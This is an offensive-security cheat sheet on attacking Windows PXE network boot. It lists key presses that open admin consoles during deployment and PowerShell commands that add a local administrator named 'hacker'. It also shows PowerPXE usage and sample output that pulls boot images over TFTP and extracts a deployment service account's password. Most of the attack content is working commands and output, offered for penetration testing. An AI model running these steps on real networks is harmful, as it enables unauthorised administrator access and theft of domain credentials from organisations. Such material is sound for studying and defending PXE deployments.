# Internal - PXE Boot Image 

PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.

- Press **[F8]** during the PXE boot to spawn an administrator console on the deployed machine.
- Press **[SHIFT+F10]** during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.

    ```powershell
    net user hacker Password123! /add
    net localgroup administrators /add hacker
    ```

- Extract the pre-boot image (wim files) using [PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)](https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.

    ```powershell
    # Import the module
    PS > Import-Module .\PowerPXE.ps1

    # Start the exploit on the Ethernet interface
    PS > Get-PXEcreds -InterfaceAlias Ethernet
    PS > Get-PXECreds -InterfaceAlias « lab 0 » 

    # Wait for the DHCP to get an address
    >> Get a valid IP address
    >>> >>> DHCP proposal IP address: 192.168.22.101
    >>> >>> DHCP Validation: DHCPACK
    >>> >>> IP address configured: 192.168.22.101

    # Extract BCD path from the DHCP response
    >> Request BCD File path
    >>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
    >>> >>> TFTP IP Address:  192.168.22.3

    # Download the BCD file and extract wim files
    >> Launch TFTP download
    >>>> Transfer succeeded.
    >> Parse the BCD file: conf.bcd
    >>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
    >>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
    >> Launch TFTP download
    >>>> Transfer succeeded.

    # Parse wim files to find interesting data
    >> Open LiteTouchPE_x86.wim
    >>>> Finding Bootstrap.ini
    >>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
    >>>> >>>> UserID = MdtService
    >>>> >>>> UserPassword = Somepass1
    ```


## References

* [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
* [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger ](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)